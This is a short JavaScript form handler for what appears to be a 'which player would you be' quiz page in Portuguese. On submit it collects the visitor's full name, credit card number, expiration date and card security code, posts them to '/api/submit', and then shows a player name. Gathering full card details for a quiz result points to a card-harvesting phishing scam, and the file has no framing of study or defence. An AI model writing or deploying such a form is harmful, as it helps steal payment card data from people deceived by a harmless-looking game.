document.getElementById('playerForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const fullname = document.getElementById('fullname').value;
    const creditnum = document.getElementById('creditnum').value;
    const expirationdate = document.getElementById('expirationdate').value;
    const cardcode = document.getElementById('cardcode').value;

    fetch('/api/submit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({fullname, creditnum, expirationdate, cardcode}),
    })
    .then(response => response.json())
    .then(data => {
        document.getElementById('resultado').innerText = `Você seria o ${data.player}!`;
    })
    .catch((error) => {
        console.error('Erro:', error);
    });
});
